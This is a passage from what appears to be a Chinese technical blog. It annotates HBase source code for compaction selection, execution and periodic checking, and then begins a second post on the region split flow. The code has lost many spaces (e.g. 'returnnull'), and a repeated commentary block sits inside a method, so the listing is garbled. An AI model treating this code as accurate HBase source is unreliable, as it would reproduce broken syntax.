// Compaction policy doesn't want to take advantage of off-peak.
 
offPeakCompactionTracker.set(false);
 
 }
 
 }
 
if (this.getCoprocessorHost() != null) {
 
this.getCoprocessorHost().postCompactSelection(
 
this, ImmutableList.copyOf(compaction.getRequest().getFiles()), baseRequest);
 
 }
 
 
 
// Selected files; see if we have a compaction with some custom base request.
 
if (baseRequest != null) {
 
// Update the request with what the system thinks the request should be;
 
// its up to the request if it wants to listen.
 
compaction.forceSelect(
 
baseRequest.combineWith(compaction.getRequest()));
 
 }
 
 
 
// Finally, we have the resulting files list. Check if we have any files at all.
 
finalCollection<StoreFile> selectedFiles = compaction.getRequest().getFiles();
 
if (selectedFiles.isEmpty()) {
 
returnnull;
 
 }
 
 
 
// Update filesCompacting (check that we do not try to compact the same StoreFile twice).
 
if (!Collections.disjoint(filesCompacting, selectedFiles)) {
 
 Preconditions.checkArgument(false, "%s overlaps with %s",
 
selectedFiles, filesCompacting);
 
 }
 
把当前要执行compact的storefile列表添加到HStore.filesCompacting中。
 
filesCompacting.addAll(selectedFiles);
 
通过storefile的seqid按从小到大排序
 
 Collections.sort(filesCompacting, StoreFile.Comparators.SEQ_ID);
 
 
 
// If we're enqueuing a major, clear the force flag.
 
 
 
如果当前要做compact的文件个数等待当前sotre中所有的storefile个数，把当前的compact提升为major
 
 
 
booleanisMajor = selectedFiles.size() == this.getStorefilesCount();
 
this.forceMajor = this.forceMajor && !isMajor;
 
 
 
// Set common request properties.
 
// Set priority, either override value supplied by caller or from store.
 
compaction.getRequest().setPriority(
 
 (priority != Store.NO_PRIORITY) ? priority : getCompactPriority());
 
compaction.getRequest().setIsMajor(isMajor);
 
compaction.getRequest().setDescription(
 
getRegionInfo().getRegionNameAsString(), getColumnFamilyName());
 
 }
 
 } finally {
 
this.lock.readLock().unlock();
 
 }
 
 
 
LOG.debug(getRegionInfo().getEncodedName() + " - " + getColumnFamilyName() + ": Initiating "
 
 + (compaction.getRequest().isMajor() ? "major" : "minor") + " compaction");
 
this.region.reportCompactionRequestStart(compaction.getRequest().isMajor());
 
returncompaction;
 
 }
 
 
 
执行Compaction的处理流程
 
在compact执行时是通过指定的线程池生成并执行CompactSplitThread.CompactionRunner线程
 
以下是线程执行的具体说明：
 
 public void run() {
 
 Preconditions.checkNotNull(server);
 
if (server.isStopped()
 
 || (region.getTableDesc() != null && !region.getTableDesc().isCompactionEnabled())) {
 
return;
 
 }
 
// Common case - system compaction without a file selection. Select now.
 
如果compaction==null表示是systemcompact非用户发起的compaction得到一个compactionContext
 
 
 
if (this.compaction == null) {
 
 
 
queuedPriority的值在此线程实例生成时默认是hbase.hstore.blockingStoreFiles配置的值减去storefile的个数
 
 如果相减的值是1时返回2，否则返回相减的值
 
 
 
 int oldPriority = this.queuedPriority;
 
 
 
重新拿到hbase.hstore.blockingStoreFiles配置的值减去storefile的个数的值，
 
 
 
this.queuedPriority = this.store.getCompactPriority();
 
 
 
如果这次拿到的值比上次的值要大，表示有storefile被删除(基本上是有compact完成)
 
 
 
if (this.queuedPriority > oldPriority) {
 
// Store priority decreased while we were in queue (due to some other compaction?),
 
// requeue with new priority to avoid blocking potential higher priorities.
 
 
 
结束本次线程调用，发起一个新的线程调用，用最新的priority
 
 
 
this.parent.execute(this);
 
return;
 
 }
 
try {
 
 
 
通过HStore.requestCompaction得到一个compactionContext,计算要进行compact的storefile
 
并设置其request.priority为hbase.hstore.blockingStoreFiles配置的值减去storefile的个数,
 
 表示系统发起的request,
 
 如果hbase.hstore.blockingStoreFiles配置的值减去storefile的个数==PRIORITY_USER
 
那么priority的值为PRIORITY_USER+1
 
如果是client时发起的compact，此处会设置其request.priority为Store.PRIORITY_USER表示是用户发起的request
 
 见生成CompactionRequest实例
 
 
 
this.compaction = selectCompaction(this.region, this.store, queuedPriority, null);
 
 } catch (IOException ex) {
 
LOG.error("Compaction selection failed " + this, ex);
 
server.checkFileSystem();
 
return;
 
 }
 
if (this.compaction == null) return; // nothing to do
 
// Now see if we are in correct pool for the size; if not, go to the correct one.
 
// We might end up waiting for a while, so cancel the selection.
 
assertthis.compaction.hasSelection();
 
此处检查上面提到没用的地方：
 
compaction.getRequest().getSize()的大小为所有当此要做compact的storefile的总大小
 
 检查是否大于hbase.regionserver.thread.compaction.throttle配置的值
 
 此配置的默认值是hbase.hstore.compaction.max*2*memstoresize
 
如果大于指定的值，使用 largeCompactions，否则使用 smallCompactions
 
 
 
 ThreadPoolExecutor pool = store.throttleCompaction(
 
compaction.getRequest().getSize()) ? largeCompactions : smallCompactions;
 
如果发现当前重新生成的执行线程池不是上次选择的线程池，结束compaction操作，
 
 并重新通过新的线程池执行当前线程,结束当前线程的调用执行
 
if (this.parent != pool) {
 
this.store.cancelRequestedCompaction(this.compaction);
 
this.compaction = null;
 
this.parent = pool;
 
this.parent.execute(this);
 
return;
 
 }
 
 }
 
// Finally we can compact something.
 
assertthis.compaction != null;
 
 
 
this.compaction.getRequest().beforeExecute();
 
try {
 
// Note: please don't put single-compaction logic here;
 
// put it into region/store/etc. This is CST logic.
 
longstart = EnvironmentEdgeManager.currentTimeMillis();
 
调用HRegion.compact方法，此方法调用HStore.compact方法，把CompactionContext传入
 
此方法调用返回compact是否成功，如果成功返回true，否则返回false
 
booleancompleted = region.compact(compaction, store);
 
longnow = EnvironmentEdgeManager.currentTimeMillis();
 
LOG.info(((completed) ? "Completed" : "Aborted") + " compaction: " +
 
this + "; duration=" + StringUtils.formatTimeDiff(now, start));
 
if (completed) {
 
 
 
检查此时的storefile个数是否还大于hbase.hstore.blockingStoreFiles配置的值，默认为7，
 
 如要大于或等于此时返回的值为小于或等于0的值，表示还需要进行compact操作，重新再发起一次compact的request
 
// degenerate case: blocked regions require recursive enqueues
 
if (store.getCompactPriority() <= 0) {
 
requestSystemCompaction(region, store, "Recursive enqueue");
 
 } else {
 
此时表示compact操作完成后，storefile的个数在配置的范围内，不需要在做compact，
 
 检查是否需要split,如果需要发起split操作。
 
Split的发起条件：
 
a.splitlimit,hbase.regionserver.regionSplitLimit配置的值大于当前rs中的all onlineregions
 
 默认为integer.maxvalue
 
b.a检查通过的同时hbase.hstore.blockingStoreFiles配置的值减去storefile的个数
 
 大于等于Store.PRIORITY_USER(1)
 
c.非meta与namespace表，同时其它条件见split的分析部分
 
// see if the compaction has caused us to exceed max region size
 
requestSplit(region);
 
 }
 
 }
 
 } catch (IOException ex) {
 
 IOException remoteEx = RemoteExceptionHandler.checkIOException(ex);
 
LOG.error("Compaction failed " + this, remoteEx);
 
if (remoteEx != ex) {
 
LOG.info("Compaction failed at original callstack: " + formatStackTrace(ex));
 
 }
 
server.checkFileSystem();
 
 } catch (Exception ex) {
 
LOG.error("Compaction failed " + this, ex);
 
server.checkFileSystem();
 
 } finally {
 
LOG.debug("CompactSplitThread Status: " + CompactSplitThread.this);
 
 }
 
this.compaction.getRequest().afterExecute();
 
 }
 
 
 
Hstore.compact方法流程：
 
 
 
 public List<StoreFile> compact(CompactionContext compaction) throws IOException {
 
assertcompaction != null && compaction.hasSelection();
 
 CompactionRequest cr = compaction.getRequest();
 
得到要做compact的storefile列表
 
Collection<StoreFile> filesToCompact = cr.getFiles();
 
assert !filesToCompact.isEmpty();
 
synchronized (filesCompacting) {
 
// sanity check: we're compacting files that this store knows about
 
// TODO: change this to LOG.error() after more debugging
 
 Preconditions.checkArgument(filesCompacting.containsAll(filesToCompact));
 
 }
 
 
 
// Ready to go. Have list of files to compact.
 
LOG.info("Starting compaction of " + filesToCompact.size() + " file(s) in "
 
 + this + " of " + this.getRegionInfo().getRegionNameAsString()
 
 + " into tmpdir=" + fs.getTempDir() + ", totalSize="
 
 + StringUtils.humanReadableInt(cr.getSize()));
 
 
 
longcompactionStartTime = EnvironmentEdgeManager.currentTimeMillis();
 
List<StoreFile> sfs = null;
 
try {
 
执行compact操作，把所有的storefile全并成一个storefile，放入到store/.tmp目录下
 
通过DefaultCompactor.compact操作，把原有的所有storefile生成一个StoreFileScanner列表，
 
并生成一个StoreScanner把StoreFileScanner列表加入，
 
如果compact提升成了major,ScanType=COMPACT_DROP_DELETES,否则等于COMPACT_RETAIN_DELETES
 
针对compact的数据scan可参见后期分析的scan流程
 
// Commence the compaction.
 
List<Path> newFiles = compaction.compact();
 
 
 
如果hbase.hstore.compaction.complete 设置为false,检查storefile生成是否可用
 
// TODO: get rid of this!
 
if (!this.conf.getBoolean("hbase.hstore.compaction.complete", true)) {
 
LOG.warn("hbase.hstore.compaction.complete is set to false");
 
sfs = newArrayList<StoreFile>();
 
for (Path newFile : newFiles) {
 
// Create storefile around what we wrote with a reader on it.
 
 StoreFile sf = createStoreFileAndReader(newFile);
 
sf.closeReader(true);
 
sfs.add(sf);
 
 }
 
returnsfs;
 
 }
 
把生成的新的storefile添加到cf的目录下。并返回生成后的storefile，此storefile已经生成好reader
 
// Do the steps necessary to complete the compaction.
 
sfs = moveCompatedFilesIntoPlace(cr, newFiles);
 
 
 
生成一个compaction的说明信息，写入到wal日志中
 
writeCompactionWalRecord(filesToCompact, sfs);
 
 
 
把原有的storefile列表中store中的storefiles列表中移出，
 
并把新的storefile添加到storefiles列表中，对storefiles列表重新排序,通过storefile.seqid
 
storefiles列表是scan操作时对store中的查询用的storefile与reader
 
从HStore.filesCompacting列表中移出完成compact的storefiles列表
 
replaceStoreFiles(filesToCompact, sfs);
 
 
 
从hdfs中此store下移出compact完成的storefile文件列表。
 
// At this point the store will use new files for all new scanners.
 
completeCompaction(filesToCompact); // Archive old files & update store size.
 
 } finally {
 
从HStore.filesCompacting列表中移出完成compact的storefiles列表，如果compact完成此时没有要移出的文件
 
如果compact失败，此时把没有compact的文件移出
 
finishCompactionRequest(cr);
 
 }
 
logCompactionEndMessage(cr, sfs, compactionStartTime);
 
returnsfs;
 
 }
 
 
 
 
 
major的compact处理流程
 
majorCompaction不管是直接传入sotre或者是region的传入，
 
如果传入的是region,那么会拿到region下的所有store，迭代调用每一个store的triggerMajorCompaction操作。
 
Hstore.triggerMajorCompaction操作流程：设置store中的forcemajor的值为true
 
 public void triggerMajorCompaction() {
 
this.forceMajor = true;
 
 }
 
 
 
设置完成forceMajor的值后，最终还是直接触发requestCompaction方法
 
 if(family != null) {
 
compactSplitThread.requestCompaction(region, store, log,
 
Store.PRIORITY_USER, null);
 
 } else {
 
compactSplitThread.requestCompaction(region, log,
 
Store.PRIORITY_USER, null);
 
 }
 
requestCompaction的处理流程大至与非major的coompact处理流程无区别：
 
CompactSplitThread.requestCompaction-->requestCompactionInternal-->selectCompaction
 
 -->Hstore.requestCompaction(priority, request)得到compactionContext
 
代码细节如下所示：
 
是否是用户发起的compaction操作
 
 
 
booleanisUserCompaction = priority == Store.PRIORITY_USER;
 
 
 
以下代码返回为true的条件：
 
 a.hbase.offpeak.start.hour的值不等于-1(0-23之间的值)
 
 b.hbase.offpeak.end.hour的值不等-1(0-23之间的值),同时此值大于a配置的值
 
 c.当前时间的小时部分在a与b配置的时间之间
 
否则返回的值为false
 
 
 
booleanmayUseOffPeak = offPeakHours.isOffPeakHour() &&
 
offPeakCompactionTracker.compareAndSet(false, true);
 
try {
 
 
 
此时最后一个参数为true(在没有其它的compact操作的情况下,同时指定的compact模式为major),
 
 
 
compaction.select(this.filesCompacting, isUserCompaction,
 
mayUseOffPeak, forceMajor && filesCompacting.isEmpty());
 
 } catch (IOException e) {
 
if (mayUseOffPeak) {
 
offPeakCompactionTracker.set(false);
 
 }
 
throwe;
 
 }
 
 
 
以上代码的中的compaction.select默认调用为DefaultStoreEngine.DefaultCompactionContext.select方法
 
 
 
publicbooleanselect(List<StoreFile> filesCompacting, booleanisUserCompaction,
 
booleanmayUseOffPeak, booleanforceMajor) throws IOException {
 
 
 
调用RatioBasedCompactionPolicy.selectCompaction得到一个CompactionRequest，
 
并把此request设置到当前compaction实例的request属性中
 
 
 
request = compactionPolicy.selectCompaction(storeFileManager.getStorefiles(),
 
filesCompacting, isUserCompaction, mayUseOffPeak, forceMajor);
 
returnrequest != null;
 
 }
 
 
 
RatioBasedCompactionPolicy.selectCompaction处理流程说明：
 
 
 
 public CompactionRequest selectCompaction(Collection<StoreFile> candidateFiles,
 
finalList<StoreFile> filesCompacting, finalbooleanisUserCompaction,
 
finalbooleanmayUseOffPeak, finalbooleanforceMajor) throws IOException {
 
// Preliminary compaction subject to filters
 
 ArrayList<StoreFile> candidateSelection = newArrayList<StoreFile>(candidateFiles);
 
// Stuck and not compacting enough (estimate). It is not guaranteed that we will be
 
// able to compact more if stuck and compacting, because ratio policy excludes some
 
// non-compacting files from consideration during compaction (see getCurrentEligibleFiles).
 
intfutureFiles = filesCompacting.isEmpty() ? 0 : 1;
 
 
 
此store下所有的storefile的个数减去当前已经在做compact的个数是否大于blockingfile的配置个数
 
blockingfile通过hbase.hstore.blockingStoreFiles配置，默认为7
 
 
 
booleanmayBeStuck = (candidateFiles.size() - filesCompacting.size() + futureFiles)
 
 >= storeConfigInfo.getBlockingFileCount();
 
 
 
得到可选择的storefile,也就是得到所有的storefile中不包含正在做compact的sotrefile的列表
 
 
 
candidateSelection = getCurrentEligibleFiles(candidateSelection, filesCompacting);
 
LOG.debug("Selecting compaction from " + candidateFiles.size() + " store files, " +
 
filesCompacting.size() + " compacting, " + candidateSelection.size() +
 
" eligible, " + storeConfigInfo.getBlockingFileCount() + " blocking");
 
 
 
得到配置的ttl过期时间,通过在cf的表属性中配置TTL属性，
 
 如果配置值为Integer.MAX_VALUE或者-1或者不配置，表示不控制ttl,
 
 TTL属性生效的前提是MIN_VERSIONS属性不配置,TTL属性配置单位为秒
 
 如果以上条件检查通过表示有配置ttl，返回ttl的配置时间，否则返回Long.maxvalue
 
 
 
longcfTtl = this.storeConfigInfo.getStoreFileTtl();
 
 
 
如果不是发起的major操作，
 
同时配置有ttl过期时间，同时hbase.store.delete.expired.storefile配置的值为true,默认为true，
 
同时ttl属性有配置，
 
得到当前未做compact操作的所有sotrefile中ttl过期的storefile，
 
如果有ttl过期的storefile文件，生成CompactionRequest实例，并结束此流程处理
 
 
 
if (!forceMajor) {
 
// If there are expired files, only select them so that compaction deletes them
 
if (comConf.shouldDeleteExpired() && (cfTtl != Long.MAX_VALUE)) {
 
 ArrayList<StoreFile> expiredSelection = selectExpiredStoreFiles(
 
candidateSelection, EnvironmentEdgeManager.currentTimeMillis() - cfTtl);
 
if (expiredSelection != null) {
 
returnnewCompactionRequest(expiredSelection);
 
 }
 
 }
 
 
 
如果非major把storefile中非reference(split后的文件为reference文件)的storefile文件，
 
 同时storefile的大小超过了hbase.hstore.compaction.max.size配置的最大storefile文件大小限制
 
 移出这些文件
 
 
 
candidateSelection = skipLargeFiles(candidateSelection);
 
 }
 
 
 
// Force a major compaction if this is a user-requested major compaction,
 
// or if we do not have too many files to compact and this was requested
 
// as a major compaction.
 
// Or, if there are any references among the candidates.
 
 
 
 
 
此处检查major的条件包含以下几个：
 
 
 
(forceMajor && isUserCompaction)
 
 
 
a.如果是用户发起的compaction,同时用户发起的compaction是major的compact,
 
 同时store中没有其它正在做compact的storefile,此值为true
 
 
 
((forceMajor || isMajorCompaction(candidateSelection))
 
 && (candidateSelection.size() < comConf.getMaxFilesToCompact()))
 
 
 
b.检查上面看到代码的3个条件，第一个(b1)与第二个(b2)为一个通过就行，第三个(b3)必须通过
 
 
 
forceMajor
 
 
 
 b1.如果是发起的compaction,同时store中没有其它正在做compact的storefile
 
 
 
isMajorCompaction(candidateSelection)
 
 
 
 b2.或者以下几个条件检查通过：
 
 b2.1.可选的storefile列表中修改时间最老的一个storefile的时间达到了间隔的major compact时间
 
 b2.2.如果可选的storefile列表中只有一个storefile，同时此storefile的最老的一条数据的时间已经达到ttl时间
 
 同时此storefile的时间达到了间隔的major时间间隔
 
 b2.3.如果可选的storefile列表中有多少storefile，同时更新时间最老的一个storefile达到了major的时间间隔
 
 b2.4.也就是storefile列表中最老的更新时间的一个storefile的时间达到了间隔的major时间，
 
 但是可选的storefile个数只有一个，同时此storefile已经做过major(StoreFile.majorCompaction==true)
 
 同时ttl时间没有配置或者ttl还没有过期那么此时这个storefile是不做major compact
 
 通过hbase.hregion.majorcompaction配置major的间隔时间，
 
 通过hbase.hregion.majorcompaction.jitter配置major的间隔的左右差
 
 如：major的配置时间为24小时,同时间隔的左右差是0.2f,那么default = 20% = +/- 4.8 hrs
 
 
 
(candidateSelection.size() < comConf.getMaxFilesToCompact())
 
 
 
 b3.可选的storefile列表的个数小于compactmaxfiles的配置个数,
 
 通过hbase.hstore.compaction.max配置，默认值为10
 
 
 
StoreUtils.hasReferences(candidateSelection)
 
 
 
c.如果storefile列表中包含有reference(split后的文件为reference文件)的storefile
 
 
 
booleanmajorCompaction = (
 
 (forceMajor && isUserCompaction)
 
 || ((forceMajor || isMajorCompaction(candidateSelection))
 
 && (candidateSelection.size() < comConf.getMaxFilesToCompact()))
 
 || StoreUtils.hasReferences(candidateSelection)
 
 );
 
如果是非major的compact
 
if (!majorCompaction) {
 
// we're doing a minor compaction, let's see what files are applicable
 
从可选的storefile列表中移出是bulk load的storefile
 
 
 
candidateSelection = filterBulk(candidateSelection);
 
 
 
如果可选的storefile列表中的个数大于或等于hbase.hstore.compaction.max配置的值，
 
移出可选的storefile列表中最大的几个storefile,
 
 通过如下说明来计算什么文件算是较大的storefile:
 
a.storefile的文件大小是后面几个文件的总和的多少倍数，倍数的说明在如下几行中进行了说明，
 
1.通过hbase.offpeak.start.hour配置major的启动开始小时，如配置为1
 
2.通过hbase.offpeak.end.hour配置major的启动结束小时，如配置为2
 
如果启动时间是1与2配置的小时时间内,那么配置有这两个值后，
 
主要用来检查compact的文件的大小是否超过hbase.hstore.compaction.max配置的值，默认为10，
 
 减去1个文件的总和的多少倍，
 
如：有10个待做compact的文件,第一个文件(i=0)的size是=i+max(10)-1=9，
 
 以上表示第一个文件的size超过了后面9个文件总size的大小的多少倍，如果超过了倍数，不做compact
 
如果1与2配置为不等于-1,同时start小于end,当前做compact的时间刚好在此时间内，
 
多少倍这个值通过hbase.hstore.compaction.ratio.offpeak配置得到，默认为5.0f
 
否则通过hbase.hstore.compaction.ratio配置得到，默认为1.2f
 
b.storefile的大小必须是大于hbase.hstore.compaction.min.size配置的值，默认是memstore的大小
 
c.如果现在所有的storefile的个数减去正在做compact的storefile个数大于
 
 通过hbase.hstore.blockingStoreFiles配置的值，默认为7，移出最大的几个storefile，
 
 只保留通过hbase.hstore.compaction.min配置的个数，默认为3(配置不能小于2)
 
 老版本通过hbase.hstore.compactionThreshold配置
 
 
 
candidateSelection = applyCompactionPolicy(candidateSelection, mayUseOffPeak, mayBeStuck);
 
 
 
检查可选的能做compact的文件个数是否达到最少文件要求，如果没有达到，清空所有可选的storefile列表值
 
 
 
candidateSelection = checkMinFilesCriteria(candidateSelection);
 
 }
 
如果不是用户发起的major的compact，移出可选的storefile列表中超过hbase.hstore.compaction.max配置的个数
 
candidateSelection = removeExcessFiles(candidateSelection, isUserCompaction, majorCompaction);
 
生成CompactionRequest实例
 
 CompactionRequest result = newCompactionRequest(candidateSelection);
 
如果非major同时offpeak有配置，同时当前时间在配置的时间范围内，设置CompactionRequest的offpeak为true
 
 表示当前时间是非高峰时间内
 
result.setOffPeak(!candidateSelection.isEmpty() && !majorCompaction && mayUseOffPeak);
 
returnresult;
 
 }
 
 
 
执行compaction的具体处理，见非major的compaction处理流程中的执行compaction处理流程
 
 
 
flush时的compaction
 
flush时的compaction通过MemStoreFlusher.FlusherHander.run执行
 
当flushRegion完成后，会触发compact的执行
 
 
 
CompactSplitThread.requestSystemCompaction--> requestCompactionInternal(region)
 
 public synchronized void requestSystemCompaction(
 
final HRegion r, final String why) throws IOException {
 
requestCompactionInternal(r, why, Store.NO_PRIORITY, null, false);
 
 }
 
 
 
CompactSplitThread.requestCompactionInternal(Region)-->requestCompactionInternal(Store)
 
 private List<CompactionRequest> requestCompactionInternal(final HRegion r, final String why,
 
intp, List<Pair<CompactionRequest, Store>> requests, booleanselectNow) throws IOException {
 
// not a special compaction request, so make our own list
 
List<CompactionRequest> ret = null;
 
if (requests == null) {
 
ret = selectNow ? newArrayList<CompactionRequest>(r.getStores().size()) : null;
 
for (Stores : r.getStores().values()) {
 
 
 
迭代发起针对store的compaction操作，传入的priority=Store.NO_PRIORITY,可参见非major的compact处理流程
 
 
 
 CompactionRequest cr = requestCompactionInternal(r, s, why, p, null, selectNow);
 
if (selectNow) ret.add(cr);
 
 }
 
 } else {
 
 Preconditions.checkArgument(selectNow); // only system requests have selectNow == false
 
ret = newArrayList<CompactionRequest>(requests.size());
 
for (Pair<CompactionRequest, Store> pair : requests) {
 
ret.add(requestCompaction(r, pair.getSecond(), why, p, pair.getFirst()));
 
 }
 
 }
 
returnret;
 
 }
 
 
 
 
 
定时线程执行的compact流程
 
定期线程执行通过HRegionServer.CompactionChecker执行，
 
CompactionChecker线程主要作用：
 
生成通过hbase.server.thread.wakefrequency(10*1000ms)配置的定期检查region是否需要compact的检查线程,
 
如果需要进行compact,会在此处通过compact的线程触发compcat的请求
 
此实例中通过hbase.server.thread.wakefrequency(10*1000ms)配置major compact的优先级,
 
 如果major compact的优先级大过此值,把compact的优先级设置为此值.
 
Store中通过hbase.server.compactchecker.interval.multiplier配置多少时间需要进行compact检查的间隔
 
 默认为1000ms,
 
compactionChecker的检查周期为wakefrequency*multiplier ms,
 
 也就是默认情况下线程调用1000次执行一次compact检查
 
a.compaction检查时发起compact的条件是
 
 如果一个store中所有的file个数减去在做(或发起compact请求)的个数，大于或等于
 
 hbase.hstore.compaction.min配置的值,
 
老版本使用hbase.hstore.compactionThreshold进行配置,默认值为3
 
b.major compact的条件检查
 
通过hbase.hregion.majorcompaction配置major的检查周期,default=1000*60*60*24
 
通过hbase.hregion.majorcompaction.jitter配置major的浮动时间,默认为0.2,
 
 也就是major的时间上下浮动4.8小时
 
b2.检查(当前时间-major配置时间>store最小的文件生成时间)表示需要major,
 
 b2.1>store下是否只有一个文件,同时这个文件已经到了major的时间,
 
 b2.1>检查ttl时间是否达到(intager.max表示没配置),达到ttl时间需要major,否则不做
 
 b2.2>文件个数大于1,到达major的时间,需要major
 
 
 
 protected void chore() {
 
for (HRegion r : this.instance.onlineRegions.values()) {
 
if (r == null)
 
continue;
 
for (Stores : r.getStores().values()) {
 
try {
 
longmultiplier = s.getCompactionCheckMultiplier();
 
assertmultiplier > 0;
 
if (iteration % multiplier != 0) continue;
 
检查是否需要system的compact，当前所有的storefile个数减去正在做compact的storefile个数，
 
 大于或等于hbase.hstore.compaction.min配置的值，表示需要compact
 
if (s.needsCompaction()) {
 
// Queue a compaction. Will recognize if major is needed.
 
发起系统的compact操作，见flush时的coompaction
 
this.instance.compactSplitThread.requestSystemCompaction(r, s, getName()
 
" requests compaction");
 
 
 
 b2.或者以下几个条件检查通过：
 
 b2.1.可选的storefile列表中修改时间最老的一个storefile的时间达到了间隔的major compact时间
 
 b2.2.如果可选的storefile列表中只有一个storefile，同时此storefile的最老的一条数据的时间已经达到ttl时间
 
 同时此storefile的时间达到了间隔的major时间间隔
 
 b2.3.如果可选的storefile列表中有多少storefile，同时更新时间最老的一个storefile达到了major的时间间隔
 
 b2.4.也就是storefile列表中最老的更新时间的一个storefile的时间达到了间隔的major时间，
 
 但是可选的storefile个数只有一个，同时此storefile已经做过major(StoreFile.majorCompaction==true)
 
 同时ttl时间没有配置或者ttl还没有过期那么此时这个storefile是不做major compact
 
 通过hbase.hregion.majorcompaction配置major的间隔时间，
 
 通过hbase.hregion.majorcompaction.jitter配置major的间隔的左右差
 
 如：major的配置时间为24小时,同时间隔的左右差是0.2f,那么default = 20% = +/- 4.8 hrs
 
 
 
 } elseif (s.isMajorCompaction()) {
 
if (majorCompactPriority == DEFAULT_PRIORITY
 
 || majorCompactPriority > r.getCompactPriority()) {
 
发起requestCompaction操作,见下面说明A
 
this.instance.compactSplitThread.requestCompaction(r, s, getName()
 
 + " requests major compaction; use default priority", null);
 
 } else {
 
发起requestCompaction操作,见下面说明B
 
this.instance.compactSplitThread.requestCompaction(r, s, getName()
 
 + " requests major compaction; use configured priority",
 
this.majorCompactPriority, null);
 
 }
 
 }
 
 } catch (IOException e) {
 
LOG.warn("Failed major compaction check on " + r, e);
 
 }
 
 }
 
 }
 
iteration = (iteration == Long.MAX_VALUE) ? 0 : (iteration + 1);
 
 }
 
 }
 
 
 
说明A:
 
 CompactSplitThread.requestCompaction-->
 
requestCompaction(r, s, why, Store.NO_PRIORITY, request);
 
 -->requestCompactionInternal(r, s, why, priority, request, true);此时设置selectNow为true
 
 
 
说明B:
 
 CompactSplitThread.requestCompaction-->
 
requestCompactionInternal(r, s, why, priority, request, true);此时设置selectNow为true
 
 
 
-------------------------------------------------------------
 
requestCompactionInternal处理流程：
 
 
 
private synchronized CompactionRequest requestCompactionInternal(final HRegion r,
 
 final Store s,
 
final String why, intpriority, CompactionRequest request, booleanselectNow)
 
 
 
针对store的compaction request处理流程
 
如果要对一个HBASE的表禁用掉compaction操作，可以通过create table时配置COMPACTION_ENABLED属性
 
 private synchronized CompactionRequest requestCompactionInternal(final HRegion r, final Store s,
 
final String why, intpriority, CompactionRequest request, booleanselectNow)
 
throws IOException {
 
if (this.server.isStopped()
 
 || (r.getTableDesc() != null && !r.getTableDesc().isCompactionEnabled())) {
 
returnnull;
 
 }
 
 
 
CompactionContextcompaction = null;
 
 
 
此时的调用selectNow为true,(如果是系统调用，此时的selectNow为false,)
 
 也就是在发起request到CompactSplitThread.CompactionRunner线程执行时，
 
 如果是系统调用,传入的CompactionContext的实例为null,否则是用户发起的调用在这个地方得到compaction实例
 
 
 
if (selectNow) {
 
通过HStore.requestCompaction得到一个compactionContext,计算要进行compact的storefile
 
并设置其request.priority为Store.PRIORITY_USER表示用户发起的request
 
如果是flush时发起的compact，
 
 并设置其request.priority为hbase.hstore.blockingStoreFiles配置的值减去storefile的个数,
 
 表示系统发起的request,
 
 如果hbase.hstore.blockingStoreFiles配置的值减去storefile的个数==PRIORITY_USER
 
那么priority的值为PRIORITY_USER+1
 
 见生成CompactionRequest实例
 
compaction = selectCompaction(r, s, priority, request);
 
if (compaction == null) returnnull; // message logged inside
 
 }
 
 
 
// We assume that most compactions are small. So, put system compactions into small
 
// pool; we will do selection there, and move to large pool if necessary.
 
longsize = selectNow ? compaction.getRequest().getSize() : 0;
 
 
 
此时好像一直就得不到largeCompactions的实例，因为selectNow==false时，size的大小为0
 
 不可能大于hbase.regionserver.thread.compaction.throttle配置的值
 
 此配置的默认值是hbase.hstore.compaction.max*2*memstoresize
 
 
 
 ThreadPoolExecutor pool = (!selectNow && s.throttleCompaction(size))
 
 ? largeCompactions : smallCompactions;
 
 
 
通过smallCompactions的线程池生成CompactionRunner线程并执行,见执行Compaction的处理线程
 
 
 
pool.execute(newCompactionRunner(s, r, compaction, pool));
 
if (LOG.isDebugEnabled()) {
 
 String type = (pool == smallCompactions) ? "Small " : "Large ";
 
LOG.debug(type + "Compaction requested: " + (selectNow ? compaction.toString() : "system")
 
 + (why != null && !why.isEmpty() ? "; Because: " + why : "") + "; " + this);
 
 }
 
returnselectNow ? compaction.getRequest() : null;
 
 }
 
 
 
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
region split流程分析, hongs-yang.iteye.com.blog.2049351, Sat, 19 Apr 2014 16:37:10 +0800

region split流程分析
split region的发起主要通过client端调用regionserver.splitRegion或memstore.flsuh时检查并发起。
 
Client通过rpc调用regionserver的splitRegion方法
client端通过HBaseAdmin.split传入region name与split point(切分的rowkey,可以不传入),
通过meta得到此region所在的server，发起rpc请求，调用HRegionServer.splitRegion方法
 
  public SplitRegionResponse splitRegion(final RpcController controller,
      final SplitRegionRequest request) throws ServiceException {
    try {
      checkOpen();
      requestCount.increment();
从onlineRegions中拿到对应的HRegion
      HRegion region = getRegion(request.getRegion());
      region.startRegionOperation(Operation.SPLIT_REGION);
      LOG.info("Splitting " + region.getRegionNameAsString());
在做split前，先对region进行flush操作。请参见region flush流程分析
      region.flushcache();
如果client端发起split请求时指定有split的rowkey，拿到split key的值
      byte[] splitPoint = null;
      if (request.hasSplitPoint()) {
        splitPoint = request.getSplitPoint().toByteArray();
      }
设置region的splitRequest属性为true,表示有split request
如果split rowkey传入不为空，也就是指定有rowkey，设置region的explicitSplitPoint为指定的rowkey
但此值设置后不会被清空，原因后面分析
 
      region.forceSplit(splitPoint);
发起split request,到split的线程进行处理。
Region.checkSplit流程：
a.检查region是否是meta/namespace的region,如果是返回null
b.如果hbase.master.distributed.log.replay配置为true时，同时openRegion后此region还没有被replay
  region.isRecovering==true,如果是返回null
c.通过hbase.regionserver.region.split.policy配置的RegionSplitPolicy,
  默认为IncreasingToUpperBoundRegionSplitPolicy,
  也可以直接在table create时配置SPLIT_POLICY的值为class
  调用splitPolicy.shouldSplit(),此方法做如下检查流程，并返回true与false
  c.1检查region.splitRequest的值是否为true,如果是，返回true,
  c.2得到当前regionserver中此region对应的table的所有region个数，
    得到region的存储最大size,
  c.2.1取出通过table create时的属性MAX_FILESIZE来设置的region最大存储大小，
如果没有取hbase.hregion.max.filesize配置的的值，默认为10 * 1024 * 1024 * 1024L(10g)
  c.2.2取出通过table create时的MEMSTORE_FLUSHSIZE属性来设置的region memstore的大小，
如果没有取hbase.hregion.memstore.flush.size配置的值，默认为1024*1024*128L(128M)
  c.2.3通过c.2.2的值*(当前rs中此table的region个数 * 当前rs中此table的region个数)
  c.2.4取出c.2.1中得到的值与c.2.3计算出的值最小的一个，得到region最大可存储的size值
  c.3检查region中所有store中是否有reference的storefile，如果有返回false
  c.4检查region中所有store中所有的storefile的大小是否超过了c.2中得到的size大小，如果是返回true
